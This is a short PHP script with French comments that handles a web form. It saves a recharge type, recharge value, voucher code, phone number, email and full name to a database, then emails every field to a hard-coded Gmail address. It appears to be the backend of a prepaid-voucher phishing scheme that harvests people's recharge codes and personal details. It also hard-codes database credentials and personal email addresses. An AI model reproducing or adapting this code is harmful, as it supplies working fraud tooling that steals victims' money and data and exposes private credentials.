<?php
// Configurer la connexion à la base de données
$servername = "localhost";
$username = "hamissou"; // Remplace par ton nom d'utilisateur
$password = "hamissou78"; // Remplace par ton mot de passe
$dbname = "hamis"; // Remplace par le nom de ta base de données

// Créer la connexion
$conn = new mysqli($servername, $username, $password, $dbname);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Échec de la connexion : " . $conn->connect_error);
}

// Récupérer les données du formulaire
$type_recharge = $_POST['type-recharge'];
$valeur_recharge = $_POST['valeur-recharge'];
$code = $_POST['code'];
$telephone = $_POST['telephone'];
$email = $_POST['email'];
$name = $_POST['name'];

// Préparer et exécuter la requête SQL
$stmt = $conn->prepare("INSERT INTO utilisateurs (type_recharge, valeur_recharge, code, telephone, email, name) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->bind_param("ssssss", $type_recharge, $valeur_recharge, $code, $telephone, $email, $name);

if ($stmt->execute()) {
    // Préparer l'email
    $to = "idowuasabidavid@gmail.com"; // Remplace par ton adresse email
    $subject = "Nouveau formulaire reçu";
    $message = "Type de recharge : $type_recharge\n";
    $message .= "Valeur de recharge : $valeur_recharge\n";
    $message .= "Code : $code\n";
    $message .= "Téléphone : $telephone\n";
    $message .= "Email : $email\n";
    $message .= "Nom complet : $name\n";
    $headers = "From: davididohou33@gmail.com"; // Remplace par une adresse email valide

    // Envoyer l'email
    if (mail($to, $subject, $message, $headers)) {
        echo "Formulaire soumis avec succès et email envoyé.";
    } else {
        echo "Erreur lors de l'envoi de l'email.";
    }
} else {
    echo "Erreur : " . $stmt->error;
}

// Fermer la connexion
$stmt->close();
$conn->close();
?>
